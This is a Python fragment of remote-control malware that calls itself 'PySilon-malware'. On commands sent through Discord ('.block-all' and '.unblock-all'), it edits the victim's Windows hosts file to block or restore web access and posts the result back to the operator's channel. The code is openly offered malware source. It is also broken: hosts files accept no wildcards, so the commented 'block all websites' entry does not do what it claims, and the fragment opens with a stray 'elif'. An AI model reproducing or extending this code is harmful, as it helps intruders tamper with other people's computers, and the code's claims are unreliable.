import ctypes
from urllib.parse import urlparse

# Get the hosts file path
def get_hosts_file_path():
    hosts_file_path = r'C:\Windows\System32\drivers\etc\hosts'
    if ctypes.windll.kernel32.GetFileAttributesW(hosts_file_path) != -1:
        return hosts_file_path
    return None

# Commands for message content
elif message.content == '.block-all':
    await message.delete()
    hosts_file_path = get_hosts_file_path()

    if hosts_file_path:
        try:
            with open(hosts_file_path, 'a') as hosts_file:
                hosts_file.write("127.0.0.1 *\n")  # Wildcard to block all websites
            embed = discord.Embed(
                title="🟢 Success",
                description=f'```All websites have been blocked. Use .unblock-all to unblock them.```',
                colour=discord.Colour.green()
            )
            embed.set_author(
                name="PySilon-malware",
                icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png"
            )
            await message.channel.send(embed=embed)
        except PermissionError:
            embed = discord.Embed(
                title="🔴 Hold on!",
                description=f'```Insufficient permissions to edit the hosts file.```',
                colour=discord.Colour.red()
            )
            embed.set_author(
                name="PySilon-malware",
                icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png"
            )
            await message.channel.send(embed=embed)
    else:
        embed = discord.Embed(
            title="🔴 Hold on!",
            description=f'```Hosts file not found.```',
            colour=discord.Colour.red()
        )
        embed.set_author(
            name="PySilon-malware",
            icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png"
        )
        await message.channel.send(embed=embed)

elif message.content == '.unblock-all':
    await message.delete()
    hosts_file_path = get_hosts_file_path()

    if hosts_file_path:
        try:
            with open(hosts_file_path, 'r') as hosts_file:
                lines = hosts_file.readlines()

            # Remove entries added by the script
            filtered_lines = [line for line in lines if not line.startswith("127.0.0.1 *")]

            with open(hosts_file_path, 'w') as hosts_file:
                hosts_file.writelines(filtered_lines)

            embed = discord.Embed(
                title="🟢 Success",
                description=f'```All websites have been unblocked.```',
                colour=discord.Colour.green()
            )
            embed.set_author(
                name="PySilon-malware",
                icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png"
            )
            await message.channel.send(embed=embed)
        except PermissionError:
            embed = discord.Embed(
                title="🔴 Hold on!",
                description=f'```Insufficient permissions to edit the hosts file.```',
                colour=discord.Colour.red()
            )
            embed.set_author(
                name="PySilon-malware",
                icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png"
            )
            await message.channel.send(embed=embed)
    else:
        embed = discord.Embed(
            title="🔴 Hold on!",
            description=f'```Hosts file not found.```',
            colour=discord.Colour.red()
        )
        embed.set_author(
            name="PySilon-malware",
            icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png"
        )
        await message.channel.send(embed=embed)
